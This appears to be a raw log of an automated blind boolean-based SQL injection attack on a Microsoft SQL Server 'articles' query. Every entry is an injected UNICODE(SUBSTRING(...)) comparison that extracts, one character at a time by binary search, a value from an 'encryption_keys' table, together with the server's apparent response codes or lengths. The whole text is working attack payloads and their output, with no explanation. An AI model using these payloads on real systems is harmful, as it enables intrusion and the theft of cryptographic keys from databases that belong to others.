+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),5,1))>64	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),5,1))>32	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),5,1))>48	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),5,1))>56	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),5,1))>52	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),5,1))>54	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),5,1))>55	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),6,1))>47	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),6,1))>87	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),6,1))>67	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),6,1))>57	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),6,1))>52	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),6,1))>54	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),6,1))>55	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),6,1))>56	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),7,1))>47	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),7,1))>87	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),7,1))>67	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),7,1))>57	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),7,1))>52	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),7,1))>54	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),7,1))>53	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),8,1))>47	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),8,1))>87	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),8,1))>107	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),8,1))>97	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),8,1))>102	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),8,1))>99	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),8,1))>100	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),8,1))>101	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),9,1))>96	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),9,1))>112	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),9,1))>104	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),9,1))>100	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),9,1))>98	408
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),9,1))>97	408
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),10,1))>96	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),10,1))>112	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),10,1))>104	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),10,1))>100	410
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),10,1))>98	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),10,1))>97	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),11,1))>96	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),11,1))>48	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),11,1))>72	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),11,1))>60	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),11,1))>54	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),11,1))>57	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),11,1))>55	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),11,1))>56	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),12,1))>47	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),12,1))>87	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),12,1))>67	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),12,1))>57	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),12,1))>52	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),12,1))>49	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),12,1))>48	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),13,1))>47	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),13,1))>87	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),13,1))>67	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),13,1))>57	409
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),13,1))>52	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),13,1))>54	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),13,1))>55	409
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST([value] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys WHERE ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST([key] AS NVARCHAR(4000)),CHAR(32)) FROM encryption_keys ORDER BY [key]) ORDER BY [key]),13,1))>56	409
+	200
+use [master]	86
+	165
